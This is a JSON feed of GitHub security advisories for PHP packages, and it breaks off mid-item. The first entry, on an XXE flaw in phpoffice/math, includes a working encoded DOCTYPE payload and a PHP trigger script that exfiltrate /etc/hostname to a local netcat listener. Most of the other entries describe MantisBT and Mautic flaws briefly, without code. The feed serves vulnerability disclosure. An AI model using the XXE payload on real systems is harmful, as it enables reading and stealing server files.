{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://xlordz.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<p><strong>Product:</strong> Math\n<strong>Version:</strong> 0.2.0\n<strong>CWE-ID:</strong> CWE-611: Improper Restriction of XML External Entity Reference\n<strong>CVSS vector v.4.0:</strong> 8.7 (AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)\n<strong>CVSS vector v.3.1:</strong> 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)\n<strong>Description:</strong> An attacker can create a special XML file, during which it processed, external entities are loaded, and it’s possible to read local server files.<br><strong>Impact:</strong> Local server files reading\n<strong>Vulnerable component:</strong> The <a href=\"https://github.com/PHPOffice/Math/blob/c3ecbf35601e2a322bf2ddba48589d79ac827b92/src/Math/Reader/MathML.php#L38C9-L38C55\"><code>loadXML</code></a> function with the unsafe <a href=\"https://www.php.net/manual/en/libxml.constants.php#constant.libxml-dtdload\"><code>LIBXML_DTDLOAD</code></a> flag, the <a href=\"https://github.com/PHPOffice/Math/blob/master/src/Math/Reader/MathML.php\"><code>MathML</code></a> class\n<strong>Exploitation conditions:</strong> The vulnerability applies only to reading a file in the <code>MathML</code> format.\n<strong>Mitigation:</strong> If there is no option to refuse using the <a href=\"https://www.php.net/manual/en/libxml.constants.php#constant.libxml-dtdload\"><code>LIBXML_DTDLOAD</code></a> flag, it’s recommended to filter external entities through the implementation of the <a href=\"https://www.php.net/manual/en/function.libxml-set-external-entity-loader.php\"><code>custom external entity loader function</code></a>.\n<strong>Researcher: Aleksandr Zhurnakov (Positive Technologies)</strong></p>\n<h2 id=\"research\">Research</h2>\n<p>Zero-day vulnerability was discovered in the <a href=\"https://github.com/PHPOffice/Math\">Math</a> library in the detailed process of the XXE vulnerability research in PHP.\nLoading XML data, using the standard <a href=\"https://www.php.net/manual/en/book.libxml.php\"><code>libxml</code></a> extension and the <a href=\"https://www.php.net/manual/en/libxml.constants.php#constant.libxml-dtdload\"><code>LIBXML_DTDLOAD</code></a> flag without additional filtration, leads to XXE.</p>\n<p>Below are steps to reproduce the vulnerability.</p>\n<ol>\n<li>Preparation:</li>\n</ol>\n<ul>\n<li>The payload was tested on the PHP versions &gt;= 8.1.</li>\n<li>The <a href=\"https://getcomposer.org/\">composer</a> manager is used to install the latest version of the Math library.</li>\n<li>PHP has to be configurated with <a href=\"https://www.php.net/manual/ru/book.zlib.php\">Zlib</a> support.</li>\n<li>The necessary <a href=\"https://github.com/PHPOffice/Math?tab=readme-ov-file#requirements\">requirements</a> for the Math library must be installed.</li>\n<li>The <code>netcat</code> utility is used for demonstration exfiltration.</li>\n</ul>\n<ol start=\"2\">\n<li>Make <code>math</code> directory and then moving into it.</li>\n</ol>\n<pre><code>mkdir math &amp;&amp; cd math\n</code></pre>\n<ol start=\"3\">\n<li>Install the latest actual version of the library (Figure 1).</li>\n</ol>\n<pre><code>composer require phpoffice/math\n</code></pre>\n<p><em>Figure 1. Installing the library</em>\n<img src=\"https://github.com/user-attachments/assets/bb0c6781-4f5a-411c-970d-9402e652ad87\" alt=\"fig2\" width=\"630\"></p>\n<ol start=\"4\">\n<li>Create <code>poc.xml</code> file (Listing 1):</li>\n</ol>\n<p><em>Listing 1. Creating <code>poc.xml</code></em></p>\n<pre><code>xml     \n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;     &lt;!DOCTYPE x SYSTEM \n\"php://filter/convert.base64-\ndecode/zlib.inflate/resource=data:,7Ztdb9owFIbv%2bRVZJ9armNjOZ2k7QUaL%2bRYO2nqFUn\nBFNQaMptP272cnNFuTsBbSskg1iATZzvGxn/ccX3A4fdfoecS7UsrK1A98hV5Rr9FVjlaz1UmlcnM7D9i\n6MlkufrB1AK79O2bqKltMllMWt96KL6ADwci7sJ4Yu0vr9/tlwKbqan27CPzrOXvevFGrbRvOGIseaCa7\nTAxok1x44xahXzQEcdKPKZPevap3RZw920I0VscWGLlU1efPsy0c5cbV1AoI7ZuOMCZW12nkcP9Q2%2bQ\nObBNmL6ajg8s6xJqmJTrq5NIArX6zVk8Zcwwt4fPuLvHnbeBSvpdIQ6g93MvUv3CHqKNrmtEW4EYmCr5g\nDT5QzyNWE4x6xO1/aqQmgMhGYgaVDFUnScKltbFnaJoKHRuHK0L1pIkuaYselMe9cPUqRmm5C51u00kkh\ny1S3aBougkl7e4d6RGaTYeSehdCjAG/O/p%2bYfKyQsoLmgdlmsFYQFDjh6GWJyGE0ZfMX08EZtwNTdAY\nud7nLcksnwppA2UnqpCzgyDo1QadAU3vLOQZ82EHMxAi0KVcq7rzas5xD6AQoeqkYkgk02abukkJ/z%2b\nNvkj%2bjUy16Ba5d/S8anhBLwt44EgGkoFkIBlIBpKBZCAZSAaSgWQgGUgGkoFkIBlIBpKBZCAZSAaSgW\nQgGUgGxWOwW2nF7kt%2by7/Kb3ag2GUTUgBvXAAxiKxt4Is3sB4WniVrOvhwzB0CXerg5GN9esGRQv7Rg\nQdMmMO9sIwtc/sIJUOCsY4ee7f7FIWu2Si4euKan8wg58nFsEIXxYGntgZqMog3Z2FrgPhgyzIOlsmijo\nwqwb0jyMqMoGEbarqdOpP/iqFISMkSVFG1Z5p8f3OK%2bxAZ7gClpgUPg70rq0T2RIkcup/0newQ7NbcU\nXv/DPl4LL/N7hdfn2dp07pmd8v79YSdVVgwqcyWd8HC/8aOzkunf6r%2b2c8bpSxK/6uPmlf%2br/nSny\nrHcduH99iqKiz7HwLxTLMgEM0QWUDjb3ji8NdHPslZmV%2bqR%2bfH56Xyxni1VGbV0m8=\" \n[]&gt;&lt;foo&gt;&lt;/foo&gt;\n</code></pre>\n<ol start=\"5\">\n<li>Create <code>math.php</code> file (Listing 2):</li>\n</ol>\n<p><em>Listing 2. Creating <code>math.php</code></em></p>\n<pre><code>&lt;?php\n    require_once \"./vendor/autoload.php\";\n\n    $reader = new \\PhpOffice\\Math\\Reader\\MathML();\n    $reader-&gt;read(\n        file_get_contents('poc.xml')\n    );\n</code></pre>\n<ol start=\"6\">\n<li>The payload (see the step 4) is set to exfiltrate the <code>/etc/hostname</code> file through <code>http://127.0.0.1:9999/</code>, so the listening socket is launched at the <code>9999</code> port (Figure 2)</li>\n</ol>\n<p><em>Figure 2. Launching the listening socket</em>\n<img src=\"https://github.com/user-attachments/assets/6da5b966-70be-4e3e-9bde-c6baf4dfef34\" alt=\"fig2\" width=\"550\"></p>\n<ol start=\"7\">\n<li>Execute php-script via console:</li>\n</ol>\n<pre><code>php math.php \n</code></pre>\n<p>6 characters from the <code>/etc/hostname</code> file will be exfiltrated to the <code>9999</code> port in base64 format (Figure 3). </p>\n<p><em>Figure 3. Characters exfiltration</em>\n<img src=\"https://github.com/user-attachments/assets/f0eae873-d156-442f-ab08-12dd94a8dbe9\" alt=\"fig3\" width=\"520\"></p>\n<p>Decode the received data from base64 removing the last <code>M</code> character (the payload feature) (Figure 4).</p>\n<p><em>Figure 4. Data decoding</em>\n<img src=\"https://github.com/user-attachments/assets/7a091a07-7856-41a0-b1bd-3d8009303ced\" alt=\"fig4\" width=\"595\"></p>\n<ol start=\"8\">\n<li>By changing the payload, the remaining file can be received.</li>\n</ol>\n<h2 id=\"credits\">Credits</h2>\n<p>Aleksandr Zhurnakov (Positive Technologies)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/Math/security/advisories/GHSA-42hm-pq2f-3r7m\">https://github.com/PHPOffice/Math/security/advisories/GHSA-42hm-pq2f-3r7m</a></li>\n<li><a href=\"https://github.com/PHPOffice/Math/commit/fc31c8f57a7a81f962cbf389fd89f4d9d06fc99a\">https://github.com/PHPOffice/Math/commit/fc31c8f57a7a81f962cbf389fd89f4d9d06fc99a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-42hm-pq2f-3r7m\">https://github.com/advisories/GHSA-42hm-pq2f-3r7m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-42hm-pq2f-3r7m",
            "title": "[phpoffice/math] PHPOffice Math allows XXE when processing an XML file in the MathML format ",
            "date_modified": "2025-05-29T17:27:40.000Z",
            "date_published": "2025-05-29T17:27:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-42hm-pq2f-3r7m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In MantisBT 2.24.3, SQL Injection can occur in the parameter \"access\" of the mc_project_get_users function through the API SOAP.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-28413\">https://nvd.nist.gov/vuln/detail/CVE-2020-28413</a></li>\n<li><a href=\"https://ethicalhcop.medium.com/cve-2020-28413-blind-sql-injection-en-mantis-bug-tracker-2-24-3-api-soap-54238f8e046d\">https://ethicalhcop.medium.com/cve-2020-28413-blind-sql-injection-en-mantis-bug-tracker-2-24-3-api-soap-54238f8e046d</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/160750/Mantis-Bug-Tracker-2.24.3-SQL-Injection.html\">http://packetstormsecurity.com/files/160750/Mantis-Bug-Tracker-2.24.3-SQL-Injection.html</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/3e37b4041bf76422541836a424ca71bc4a660247\">https://github.com/mantisbt/mantisbt/commit/3e37b4041bf76422541836a424ca71bc4a660247</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-49w9-82cj-xr48\">https://github.com/advisories/GHSA-49w9-82cj-xr48</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-49w9-82cj-xr48",
            "title": "[mantisbt/mantisbt] MantisBT SQL Injection via mc_project_get_users function",
            "date_modified": "2025-05-29T15:49:35.000Z",
            "date_published": "2022-05-24T17:37:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-49w9-82cj-xr48"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in MantisBT before 2.24.3. When editing an Issue in a Project where a Custom Field with a crafted Regular Expression property is used, improper escaping of the corresponding form input's pattern attribute allows HTML injection and, if CSP settings permit, execution of arbitrary JavaScript.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-25288\">https://nvd.nist.gov/vuln/detail/CVE-2020-25288</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=27275\">https://mantisbt.org/bugs/view.php?id=27275</a></li>\n<li><a href=\"http://github.com/mantisbt/mantisbt/commit/221cf323f16a9738a5b27aaba94758f11281d85c\">http://github.com/mantisbt/mantisbt/commit/221cf323f16a9738a5b27aaba94758f11281d85c</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/221cf323f16a9738a5b27aaba94758f11281d85c\">https://github.com/mantisbt/mantisbt/commit/221cf323f16a9738a5b27aaba94758f11281d85c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qgrr-f26j-87vf\">https://github.com/advisories/GHSA-qgrr-f26j-87vf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qgrr-f26j-87vf",
            "title": "[mantisbt/mantisbt] MantisBT XXS where a Custom Field with a crafted Regular Expression property is used",
            "date_modified": "2025-05-29T15:45:30.000Z",
            "date_published": "2022-05-24T17:29:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qgrr-f26j-87vf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An XSS issue was discovered in MantisBT before 2.24.2. Improper escaping on view_all_bug_page.php allows a remote attacker to inject arbitrary HTML into the page by saving it into a text Custom Field, leading to possible code execution in the browser of any user subsequently viewing the issue (if CSP settings allow it).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-16266\">https://nvd.nist.gov/vuln/detail/CVE-2020-16266</a></li>\n<li><a href=\"https://mantisbt.org/blog/archives/mantisbt/665\">https://mantisbt.org/blog/archives/mantisbt/665</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=27056\">https://mantisbt.org/bugs/view.php?id=27056</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/9ef8f23a8119221d010251112b1255630a46d903\">https://github.com/mantisbt/mantisbt/commit/9ef8f23a8119221d010251112b1255630a46d903</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4rrc-5vp6-m3f6\">https://github.com/advisories/GHSA-4rrc-5vp6-m3f6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4rrc-5vp6-m3f6",
            "title": "[mantisbt/mantisbt] MantisBT XSS issue on the view_all_bug_page.php ",
            "date_modified": "2025-05-29T15:45:10.000Z",
            "date_published": "2022-05-24T17:25:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4rrc-5vp6-m3f6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The proj_doc_edit_page.php Project Documentation feature in MantisBT before 2.21.3 has a stored cross-site scripting (XSS) vulnerability, allowing execution of arbitrary code (if CSP settings permit it) after uploading an attachment with a crafted filename. The code is executed when editing the document's page.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-15539\">https://nvd.nist.gov/vuln/detail/CVE-2019-15539</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/bd094dede74ff6e313e286e949e2387233a96eea\">https://github.com/mantisbt/mantisbt/commit/bd094dede74ff6e313e286e949e2387233a96eea</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=26078\">https://mantisbt.org/bugs/view.php?id=26078</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p495-jrpq-p66g\">https://github.com/advisories/GHSA-p495-jrpq-p66g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p495-jrpq-p66g",
            "title": "[mantisbt/mantisbt] MantisBT XSS when uploading an attachment",
            "date_modified": "2025-05-29T15:42:15.000Z",
            "date_published": "2022-05-24T17:11:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p495-jrpq-p66g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>MantisBT before 1.3.20 and 2.22.1 allows Post Authentication Command Injection, leading to Remote Code Execution.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-15715\">https://nvd.nist.gov/vuln/detail/CVE-2019-15715</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/5fb979604d88c630343b3eaf2b435cd41918c501\">https://github.com/mantisbt/mantisbt/commit/5fb979604d88c630343b3eaf2b435cd41918c501</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/7092573fac31eff41823f13540324db167c8bd52\">https://github.com/mantisbt/mantisbt/commit/7092573fac31eff41823f13540324db167c8bd52</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/cebfb9acb3686e8904d80bd4bc80720b54ba08e5\">https://github.com/mantisbt/mantisbt/commit/cebfb9acb3686e8904d80bd4bc80720b54ba08e5</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/fc7668c8e45db55fc3a4b991ea99d2b80861a14c\">https://github.com/mantisbt/mantisbt/commit/fc7668c8e45db55fc3a4b991ea99d2b80861a14c</a></li>\n<li><a href=\"https://mantisbt.org/bugs/changelog_page.php?project=mantisbt\">https://mantisbt.org/bugs/changelog_page.php?project=mantisbt</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=26091\">https://mantisbt.org/bugs/view.php?id=26091</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=26162\">https://mantisbt.org/bugs/view.php?id=26162</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/159219/Mantis-Bug-Tracker-2.3.0-Remote-Code-Execution.html\">http://packetstormsecurity.com/files/159219/Mantis-Bug-Tracker-2.3.0-Remote-Code-Execution.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v23g-wjvq-2fpf\">https://github.com/advisories/GHSA-v23g-wjvq-2fpf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v23g-wjvq-2fpf",
            "title": "[mantisbt/mantisbt] MantisBT Remote Code Execution",
            "date_modified": "2025-05-29T15:24:11.000Z",
            "date_published": "2022-05-24T16:58:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v23g-wjvq-2fpf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>MantisBT before 1.3.20 and 2.22.1 allows Post Authentication Command Injection, leading to Remote Code Execution.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-15715\">https://nvd.nist.gov/vuln/detail/CVE-2019-15715</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/5fb979604d88c630343b3eaf2b435cd41918c501\">https://github.com/mantisbt/mantisbt/commit/5fb979604d88c630343b3eaf2b435cd41918c501</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/7092573fac31eff41823f13540324db167c8bd52\">https://github.com/mantisbt/mantisbt/commit/7092573fac31eff41823f13540324db167c8bd52</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/cebfb9acb3686e8904d80bd4bc80720b54ba08e5\">https://github.com/mantisbt/mantisbt/commit/cebfb9acb3686e8904d80bd4bc80720b54ba08e5</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/fc7668c8e45db55fc3a4b991ea99d2b80861a14c\">https://github.com/mantisbt/mantisbt/commit/fc7668c8e45db55fc3a4b991ea99d2b80861a14c</a></li>\n<li><a href=\"https://mantisbt.org/bugs/changelog_page.php?project=mantisbt\">https://mantisbt.org/bugs/changelog_page.php?project=mantisbt</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=26091\">https://mantisbt.org/bugs/view.php?id=26091</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=26162\">https://mantisbt.org/bugs/view.php?id=26162</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/159219/Mantis-Bug-Tracker-2.3.0-Remote-Code-Execution.html\">http://packetstormsecurity.com/files/159219/Mantis-Bug-Tracker-2.3.0-Remote-Code-Execution.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v23g-wjvq-2fpf\">https://github.com/advisories/GHSA-v23g-wjvq-2fpf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v23g-wjvq-2fpf",
            "title": "[mantisbt/mantisbt] MantisBT Remote Code Execution",
            "date_modified": "2025-05-29T15:24:11.000Z",
            "date_published": "2022-05-24T16:58:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v23g-wjvq-2fpf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Timeline feature in my_view_page.php in MantisBT through 2.21.1 has a stored cross-site scripting (XSS) vulnerability, allowing execution of arbitrary code (if CSP settings permit it) after uploading an attachment with a crafted filename. The code is executed for any user having visibility to the issue, whenever My View Page is displayed.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-15074\">https://nvd.nist.gov/vuln/detail/CVE-2019-15074</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/9cee1971c498bbe0a72bca1c773fae50171d8c27\">https://github.com/mantisbt/mantisbt/commit/9cee1971c498bbe0a72bca1c773fae50171d8c27</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=25995\">https://mantisbt.org/bugs/view.php?id=25995</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gg4j-279j-22ph\">https://github.com/advisories/GHSA-gg4j-279j-22ph</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gg4j-279j-22ph",
            "title": "[mantisbt/mantisbt] MantisBT allows cross-site scripting (XSS) via crafted filename",
            "date_modified": "2025-05-29T15:23:49.000Z",
            "date_published": "2022-05-24T16:54:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gg4j-279j-22ph"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A cross-site scripting (XSS) vulnerability in the View Filters page (view_filters_page.php) and Edit Filter page (manage_filter_edit_page.php) in MantisBT 2.1.0 through 2.17.0 allows remote attackers to inject arbitrary code (if CSP settings permit it) through a crafted PATH_INFO. NOTE: this vulnerability exists because of an incomplete fix for CVE-2018-13055.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-16514\">https://nvd.nist.gov/vuln/detail/CVE-2018-16514</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=24731\">https://mantisbt.org/bugs/view.php?id=24731</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/66091a42626631a3063774eb0fb8a4218ab22fd4\">https://github.com/mantisbt/mantisbt/commit/66091a42626631a3063774eb0fb8a4218ab22fd4</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/blob/006cd0cd90c37097e1a065fd3e59ce2534490834/core/filter_form_api.php#L2779\">https://github.com/mantisbt/mantisbt/blob/006cd0cd90c37097e1a065fd3e59ce2534490834/core/filter_form_api.php#L2779</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3qv7-98vm-xx2v\">https://github.com/advisories/GHSA-3qv7-98vm-xx2v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3qv7-98vm-xx2v",
            "title": "[mantisbt/mantisbt] MantisBT cross-site scripting (XSS) vulnerability through crafted PATH_INFO",
            "date_modified": "2025-05-29T15:23:16.000Z",
            "date_published": "2022-05-24T16:48:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3qv7-98vm-xx2v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in file_download.php in MantisBT before 2.24.3. Users without access to view private issue notes are able to download the (supposedly private) attachments linked to these notes by accessing the corresponding file download URL directly.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-25781\">https://nvd.nist.gov/vuln/detail/CVE-2020-25781</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=27039\">https://mantisbt.org/bugs/view.php?id=27039</a></li>\n<li><a href=\"http://github.com/mantisbt/mantisbt/commit/5595c90f11c48164331a20bb9c66098980516e93\">http://github.com/mantisbt/mantisbt/commit/5595c90f11c48164331a20bb9c66098980516e93</a></li>\n<li><a href=\"http://github.com/mantisbt/mantisbt/commit/9de20c09e5a557e57159a61657ce62f1a4f578fe\">http://github.com/mantisbt/mantisbt/commit/9de20c09e5a557e57159a61657ce62f1a4f578fe</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xjmx-cprh-646r\">https://github.com/advisories/GHSA-xjmx-cprh-646r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xjmx-cprh-646r",
            "title": "[mantisbt/mantisbt] MantisBT unauthorized users able to access private files",
            "date_modified": "2025-05-29T14:09:18.000Z",
            "date_published": "2022-05-24T17:29:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xjmx-cprh-646r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in MantisBT before 2.24.5. It associates a unique cookie string with each user. This string is not reset upon logout (i.e., the user session is still considered valid and active), allowing an attacker who somehow gained access to a user's cookie to login as them.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2009-20001\">https://nvd.nist.gov/vuln/detail/CVE-2009-20001</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=11296\">https://mantisbt.org/bugs/view.php?id=11296</a></li>\n<li><a href=\"https://mantisbt.org/bugs/view.php?id=27976\">https://mantisbt.org/bugs/view.php?id=27976</a></li>\n<li><a href=\"https://github.com/mantisbt/mantisbt/commit/79a78c09d5ef5ce098adc73f6f1416f00fc238a5\">https://github.com/mantisbt/mantisbt/commit/79a78c09d5ef5ce098adc73f6f1416f00fc238a5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jm72-67rm-763j\">https://github.com/advisories/GHSA-jm72-67rm-763j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jm72-67rm-763j",
            "title": "[mantisbt/mantisbt] MantisBT Insufficient Session Experation allows for credential theft",
            "date_modified": "2025-05-28T23:02:26.000Z",
            "date_published": "2022-04-21T01:54:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jm72-67rm-763j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory addresses an Open Redirection vulnerability in Mautic's user unlocking endpoint. This vulnerability could be exploited by an attacker to redirect legitimate users to malicious websites, potentially leading to phishing attacks or the delivery of exploit kits.</p>\n<p>Open Redirection via <code>returnUrl</code> Parameter: An Open Redirection vulnerability exists in the <code>/s/action/unlock/user.user/0</code> endpoint. The <code>returnUrl</code> parameter, intended for post-action redirection, is not properly validated. This allows an attacker to craft a URL that, when clicked by a user, redirects them to an arbitrary external website controlled by the attacker.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Update Mautic to a version that properly validates or sanitizes the <code>returnUrl</code> parameter to ensure that redirects only occur to trusted, internal URLs or explicitly whitelisted domains.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-6vx9-9r2g-8373\">https://github.com/mautic/mautic/security/advisories/GHSA-6vx9-9r2g-8373</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5256\">https://nvd.nist.gov/vuln/detail/CVE-2025-5256</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6vx9-9r2g-8373\">https://github.com/advisories/GHSA-6vx9-9r2g-8373</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6vx9-9r2g-8373",
            "title": "[mautic/core] Mautic has an Open Redirect vulnerability on user unlock path.",
            "date_modified": "2025-05-29T07:10:08.000Z",
            "date_published": "2025-05-28T17:39:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6vx9-9r2g-8373"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory addresses an Open Redirection vulnerability in Mautic's user unlocking endpoint. This vulnerability could be exploited by an attacker to redirect legitimate users to malicious websites, potentially leading to phishing attacks or the delivery of exploit kits.</p>\n<p>Open Redirection via <code>returnUrl</code> Parameter: An Open Redirection vulnerability exists in the <code>/s/action/unlock/user.user/0</code> endpoint. The <code>returnUrl</code> parameter, intended for post-action redirection, is not properly validated. This allows an attacker to craft a URL that, when clicked by a user, redirects them to an arbitrary external website controlled by the attacker.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Update Mautic to a version that properly validates or sanitizes the <code>returnUrl</code> parameter to ensure that redirects only occur to trusted, internal URLs or explicitly whitelisted domains.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-6vx9-9r2g-8373\">https://github.com/mautic/mautic/security/advisories/GHSA-6vx9-9r2g-8373</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5256\">https://nvd.nist.gov/vuln/detail/CVE-2025-5256</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6vx9-9r2g-8373\">https://github.com/advisories/GHSA-6vx9-9r2g-8373</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6vx9-9r2g-8373",
            "title": "[mautic/core] Mautic has an Open Redirect vulnerability on user unlock path.",
            "date_modified": "2025-05-29T07:10:08.000Z",
            "date_published": "2025-05-28T17:39:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6vx9-9r2g-8373"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This advisory addresses an Open Redirection vulnerability in Mautic's user unlocking endpoint. This vulnerability could be exploited by an attacker to redirect legitimate users to malicious websites, potentially leading to phishing attacks or the delivery of exploit kits.</p>\n<p>Open Redirection via <code>returnUrl</code> Parameter: An Open Redirection vulnerability exists in the <code>/s/action/unlock/user.user/0</code> endpoint. The <code>returnUrl</code> parameter, intended for post-action redirection, is not properly validated. This allows an attacker to craft a URL that, when clicked by a user, redirects them to an arbitrary external website controlled by the attacker.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Update Mautic to a version that properly validates or sanitizes the <code>returnUrl</code> parameter to ensure that redirects only occur to trusted, internal URLs or explicitly whitelisted domains.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-6vx9-9r2g-8373\">https://github.com/mautic/mautic/security/advisories/GHSA-6vx9-9r2g-8373</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5256\">https://nvd.nist.gov/vuln/detail/CVE-2025-5256</a></li>\n<li><a 